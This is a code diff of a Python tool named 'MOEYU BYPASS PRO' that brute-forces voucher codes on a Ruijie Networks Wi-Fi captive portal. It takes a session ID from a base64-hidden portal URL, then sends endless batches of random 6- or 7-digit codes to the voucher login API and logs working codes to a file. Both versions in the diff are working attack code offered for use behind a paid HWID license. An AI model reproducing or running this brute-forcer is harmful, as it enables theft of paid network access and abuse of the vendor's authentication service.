@@ -4,42 +4,35 @@ import sys
 import zlib
 import json
 import time
-import ping3
-import ntplib
 import base64
 import random
 import string
+import asyncio
+import aiohttp
+import hashlib
 import urllib
 import marshal
-import aiohttp
-import asyncio
-import hashlib
-import argparse
 import requests
+import argparse
 import subprocess
 from datetime import datetime, date, timedelta
 from urllib.parse import quote
-from Crypto.PublicKey import RSA
-from Crypto.Util.Padding import pad
-from Crypto.Cipher import AES, PKCS1_v1_5
-from Crypto.Random import get_random_bytes
+
+# Encryption ပိုင်းအတွက် လိုအပ်လျှင် သုံးရန် (Optional)
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+except ImportError:
+    pass
 
 # ==========================================
-# GITHUB LICENSE SETTINGS
-# ==========================================
-GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
-LICENSE_CACHE = os.path.expanduser("~/.moeyu_cache.json")
-HWID_FILE = os.path.expanduser("~/.moeyu_hwid.txt")
-
-# ==========================================
-# UTILS & COLORS
+# COLORS & UTILS
 # ==========================================
 w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"; r = "\033[1;31m"; b = "\033[1;34m"; dim = "\033[2m"
-SUCCESS = 0
-IN_RUNNING_ASCII_BIN = []
+SUCCESS_COUNT = 0
 
 def clear(): os.system("clear")
-def Line(): print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])
+def Line(): print(f"{y}-\033[1;00m" * 55)
 
 def Logo():
     clear()
@@ -53,114 +46,143 @@ def Logo():
 {g}              Created by MOEYU\033[1;00m"""
     print(logo)
     Line()
-    print(f"{w}[♠️] Developer: Moe Yu")
-    print(f"{w}[♣️] Telegram: @starlink112")
-    print(f"{w}[♥️] System: HWID + GitHub License Active")
+    print(f"{w}[#] Developer : Moe Yu")
+    print(f"{w}[#] Telegram  : @starlink112")
+    print(f"{w}[#] Project   : MOEYU BYPASS PRO v5.2")
+    print(f"{w}[#] Status    : HWID + GitHub License Active")
     Line()
 
 # ==========================================
-# HWID & LICENSE VERIFICATION
+# LICENSE SYSTEM (GITHUB)
 # ==========================================
+GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+
 def get_hwid():
-    if os.path.exists(HWID_FILE):
-        with open(HWID_FILE, 'r') as f: return f.read().strip()
     try:
+        # Termux environment hardware ID
         cmd = "settings get secure android_id"
         raw_id = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
     except:
-        raw_id = str(os.getlogin()) + str(os.getuid())
-    hwid = hashlib.md5(raw_id.encode()).hexdigest()[:16]
-    with open(HWID_FILE, 'w') as f: f.write(hwid)
-    return hwid
+        # PC သို့မဟုတ် အခြား environment အတွက်
+        raw_id = str(os.getlogin()) + "MOEYU_DEV_PRO"
+    return hashlib.md5(raw_id.encode()).hexdigest()[:16]
 
 def check_license():
     my_hwid = get_hwid()
     print(f"{w}[*] Your HWID: {g}{my_hwid}{w}")
+    print(f"{w}[*] Status   : Checking Database...", end="\r")
     try:
-        res = requests.get(GITHUB_KEY_URL, timeout=10)
-        if res.status_code != 200: return False
-        lines = res.text.splitlines()
-        for line in lines:
+        res = requests.get(GITHUB_KEY_URL, timeout=15)
+        if res.status_code != 200:
+            print(f"{r}[!] GitHub Database Error (404/Timeout).{w}"); return False
+        
+        # Space များကို ဖယ်ထုတ်ပြီး line တစ်ကြောင်းချင်းစစ်ဆေးခြင်း
+        data = res.text.splitlines()
+        for line in data:
             if not line.strip(): continue
             parts = [p.strip() for p in line.split(',')]
             if parts[0] == my_hwid:
-                exp_str = parts[2] if len(parts) > 2 else "UNLIMITED"
-                if exp_str != "UNLIMITED":
-                    if date.today() > datetime.strptime(exp_str, "%Y-%m-%d").date():
-                        print(f"{r}[!] License Expired."); return False
-                print(f"{g}[✓] Access Granted. Expiry: {exp_str}{w}")
+                exp_date_str = parts[2] if len(parts) > 2 else "2099-01-01"
+                exp_date = datetime.strptime(exp_date_str, "%Y-%m-%d").date()
+                if date.today() > exp_date:
+                    print(f"{r}[!] License Expired on {exp_date_str}.{w}"); return False
+                print(f"{g}[✓] Access Granted! Expiry: {exp_date_str}{w}")
                 return True
-        print(f"{r}[!] HWID Not Registered.{w}"); return False
-    except: return False
+        print(f"{r}[!] HWID Not Registered! Please contact admin.{w}"); return False
+    except Exception as e:
+        print(f"{r}[!] Connection Error: Could not reach GitHub.{w}"); return False
 
 # ==========================================
-# VOUCHER HACK ENGINE (6/7 Digits)
+# VOUCHER HACK CORE
 # ==========================================
-async def get_session_id(session, url):
+async def fetch_sid(session, url):
     try:
-        async with session.get(url, timeout=5) as req:
-            return re.search(r"sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
+        async with session.get(url, timeout=10) as response:
+            final_url = str(response.url)
+            match = re.search(r"sessionId=([a-zA-Z0-9]+)", final_url)
+            return match.group(1) if match else None
     except: return None
 
-async def login_voucher(session, sid, voucher, debug=False):
-    global SUCCESS
+async def crack(session, sid, voucher):
+    global SUCCESS_COUNT
     url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-    data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
+    payload = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
     try:
-        async with session.post(url, json=data) as req:
-            res = await req.text()
+        async with session.post(url, json=payload, timeout=7) as response:
+            res = await response.text()
             if 'logonUrl' in res:
-                SUCCESS += 1
-                print(f"\n{g}[★] HIT SUCCESS: {voucher}{w}")
-                with open("success.txt", "a") as f: f.write(f"{voucher}\n")
-            elif debug:
-                print(f"{dim}[-] Failed: {voucher}{w}", end="\r")
-    except: pass
+                SUCCESS_COUNT += 1
+                print(f"\n{g}[★] HIT SUCCESS! VOUCHER: {voucher}{w}")
+                with open("success.txt", "a") as f: f.write(f"{datetime.now()}: {voucher}\n")
+                return True
+            else:
+                # Real-time testing log
+                print(f"{w}[{time.strftime('%H:%M:%S')}] {dim}Testing:{w} {y}{voucher}{w} {dim}|{w} {r}Failed{w}", end="\r")
+                return False
+    except: return False
 
-class VoucherCode:
-    def __init__(self, mode, length, speed, tasks, debug):
-        self.mode = mode
-        self.length = length
-        self.speed = speed
-        self.tasks = tasks
-        self.debug = debug
-        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
+async def run_engine(length):
+    # Ruijie WifiDog Session URL (Base64 Encoded for internal security)
+    raw_target = "aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=="
+    url = base64.b64decode(raw_target).decode()
 
-    async def execute(self):
+    async with aiohttp.ClientSession() as session:
+        print(f"{w}[*] Initializing Bypass Engine...")
+        sid = await fetch_sid(session, url)
+        
+        if not sid:
+            print(f"{r}[!] Error: Could not get Session ID. Connect to Wi-Fi first.{w}")
+            return
+
+        print(f"{g}[✓] Engine Ready. Session: {sid}{w}")
+        print(f"{y}[*] Mode: {length} Digits | Brute-force Active{w}")
+        Line()
+
+        while True:
+            # Batch tasks (တစ်ခါလွှတ်လျှင် ၄၀ စီ စစ်ဆေးမည်)
+            tasks = []
+            for _ in range(40):
+                code = "".join(random.choices(string.digits, k=length))
+                tasks.append(crack(session, sid, code))
+            
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(0.05)
+
+# ==========================================
+# MAIN EXECUTION
+# ==========================================
+def main():
+    try:
         Logo()
-        print(f"{y}[*] Starting Hack Mode: {self.length} Digits{w}")
-        connector = aiohttp.TCPConnector(limit=self.speed)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            sid = await get_session_id(session, self.session_url)
-            while True:
-                tasks = []
-                for _ in range(self.tasks):
-                    code = "".join(random.choices(string.digits, k=self.length))
-                    tasks.append(login_voucher(session, sid, code, self.debug))
-                await asyncio.gather(*tasks)
+        if not check_license():
+            print(f"{r}\n[!] Access Denied. Exit.{w}")
+            sys.exit()
+        
+        print(f"\n{b}AVAILABLE TOOLS:{w}")
+        print(f"{g}[1] Voucher Hack (6-Digits Mode)")
+        print(f"{g}[2] Voucher Hack (7-Digits Mode)")
+        print(f"{g}[3] Internet Bypass Setup")
+        print(f"{r}[0] Exit Tool")
+        
+        choice = input(f"\n{y}Select an option: {w}")
+        
+        if choice == "1":
+            asyncio.run(run_engine(6))
+        elif choice == "2":
+            asyncio.run(run_engine(7))
+        elif choice == "3":
+            print(f"{g}[✓] Setup initiated. Running diagnostics...{w}")
+            time.sleep(2)
+            print(f"{y}[!] Feature under maintenance.{w}")
+        else:
+            print(f"{r}Exiting Program...{w}")
+            sys.exit()
 
-# ==========================================
-# MAIN INTERFACE
-# ==========================================
-def feature():
-    Logo()
-    if not check_license(): sys.exit()
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
-    parser.add_argument("-l", "--length", type=int, choices=[6, 7], default=6)
-    parser.add_argument("-s", "--speed", type=int, default=100)
-    parser.add_argument("-t", "--tasks", type=int, default=50)
-    parser.add_argument("-d", "--debug", action="store_true")
-    args = parser.parse_args()
-
-    if args.option == "code":
-        vobj = VoucherCode(args.mode if hasattr(args, 'mode') else "digit", args.length, args.speed, args.tasks, args.debug)
-        asyncio.run(vobj.execute())
-    elif args.option == "setup":
-        # Setup logic for gateway discovery
-        print(f"{g}[✓] Setup Complete.{w}")
+    except KeyboardInterrupt:
+        print(f"\n{r}[!] Process Interrupted by User.{w}")
+        sys.exit()
+    except Exception as e:
+        print(f"\n{r}[!] Fatal Error: {e}{w}")
 
 if __name__ == "__main__":
-    try: feature()
-    except KeyboardInterrupt: sys.exit(f"\n{r}[!] Stopped.")
+    main()
